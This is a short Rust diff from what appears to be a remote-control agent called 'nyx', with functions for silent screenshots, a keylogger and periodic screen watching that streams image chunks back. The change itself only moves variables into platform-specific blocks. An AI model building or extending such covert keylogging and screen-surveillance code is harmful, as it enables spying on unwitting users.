@@ -305,11 +305,6 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
 /// 截屏。macOS 用 screencapture，Linux 用 scrot/import。
 /// PNG 可能很大（1MB+），用 FileChunk 分块流回（和 download 一样）。
 fn do_screenshot(monitor: u8) -> Vec<Response> {
-    let tmp = format!("/tmp/nyx_shot_{}.png", std::process::id());
-    #[cfg(target_os = "macos")]
-    let prog = "screencapture";
-    #[cfg(all(unix, not(target_os = "macos")))]
-    let prog = "scrot";
     #[cfg(not(unix))]
     {
         let _ = monitor;
@@ -317,6 +312,11 @@ fn do_screenshot(monitor: u8) -> Vec<Response> {
     }
     #[cfg(unix)]
     {
+        let tmp = format!("/tmp/nyx_shot_{}.png", std::process::id());
+        #[cfg(target_os = "macos")]
+        let prog = "screencapture";
+        #[cfg(all(unix, not(target_os = "macos")))]
+        let prog = "scrot";
         let _ = monitor;
         let result = std::process::Command::new(prog)
             .arg("-x")
@@ -495,15 +495,16 @@ fn do_keylog(action: u8) -> Response {
 /// 简化实现：截 3 张（覆盖一个间隔周期），实际生产应后台定时任务。
 fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
     let interval = interval_secs.max(1) as u64;
+    #[allow(unused_mut)] // mut only needed on unix where chunks are pushed
     let mut all_chunks = Vec::new();
     // 截 3 张演示持续监控
     for i in 0..3u32 {
         if i > 0 {
             std::thread::sleep(std::time::Duration::from_secs(interval));
         }
-        let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
         #[cfg(unix)]
         {
+            let tmp = format!("/tmp/nyx_sw_{}_{}.png", std::process::id(), i);
             let r = std::process::Command::new("screencapture")
                 .arg("-x")
                 .arg(&tmp)
